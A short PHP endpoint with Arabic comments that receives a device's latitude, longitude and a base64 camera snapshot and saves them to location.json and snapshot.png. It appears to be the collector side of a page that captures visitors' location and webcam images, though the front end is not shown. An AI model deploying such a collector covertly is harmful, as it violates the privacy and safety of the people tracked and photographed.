<?php
// استلام البيانات المرسلة من الواجهة الأمامية
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // استخراج الإحداثيات والصورة
    $latitude = $data['location']['latitude'];
    $longitude = $data['location']['longitude'];
    $imageData = $data['image'];

    // حفظ الإحداثيات في ملف JSON
    $locationData = array(
        'latitude' => $latitude,
        'longitude' => $longitude,
        'timestamp' => date('Y-m-d H:i:s')
    );
    file_put_contents('location.json', json_encode($locationData, JSON_PRETTY_PRINT));

    // استخراج بيانات الصورة وحفظها في ملف PNG
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    $imageData = str_replace(' ', '+', $imageData);
    $image = base64_decode($imageData);
    file_put_contents('snapshot.png', $image);

    echo "Data saved successfully!";
} else {
    echo "No data received!";
}
?>
